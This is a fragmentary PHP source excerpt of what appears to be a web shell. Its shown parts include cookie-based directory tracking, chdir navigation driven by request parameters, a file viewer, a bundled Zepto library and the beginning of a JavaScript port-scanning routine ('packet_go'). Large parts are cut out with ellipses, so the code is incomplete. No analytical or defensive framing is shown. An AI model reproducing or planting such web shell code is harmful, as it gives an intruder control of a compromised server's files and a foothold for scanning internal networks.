...
if (!function_exists('get_cwd')) {
    function get_cwd()
    {
        ...
        $sycode_cwd = \Yuri2::autoEncoding($cwd);
        setcookie("cwd", $cwd,time()-1);
        if (!isset($_COOKIE['cwd'])) {
            setcookie("cwd", $sycode_cwd);
        } else {
            $cwd_c = rawurldecode($_COOKIE['cwd']);
            if (is_dir($cwd_c)) {
                $sycode_cwd = realpath($cwd_c) . DIRECTORY_SEPARATOR;
            } else {
                setcookie("cwd", $sycode_cwd);
            }
        }
...
}    chdir(\Yuri2::autoSysCoding(get_cwd()));
...
if (isset($p['viewEntry'])) {
    ...
    if (is_file($path)) {
        ...
        setcookie("cwd", \Yuri2::autoEncoding($dirname));
        chdir($dirname);
        $nav = get_nav($dirname);
        ...
        $path = realpath($path) . DIRECTORY_SEPARATOR;
        setcookie("cwd", \Yuri2::autoEncoding($path));
        chdir($path);
        $nav = get_nav($path);
        $cwd = html_safe($path);
...
if (isset($p['cd'])) {
    ...
    $path = realpath(Yuri2::autoSysCoding($path));
...
<script type='text/javascript'>
    ...
    var Zepto = function () {
        ...
        var a, b, c, d, e = [], f = e.slice, g = e.filter, h = window.document, i = {}, j = {}, k = {
            ...
            r = ["after", "prepend", "before", "append"], s = h.createElement("table"), t = h.createElement("tr"), u = {
    ...
    function packet_go() {
        ...
        if (packetStartPort > packetEndPort) {
            start1 = packetEndPort;
            end = packetStartPort
        } else {
            start1 = packetStartPort;
            end = packetEndPort
        }
        packetResult.html('');
        while (start1 <= end) {
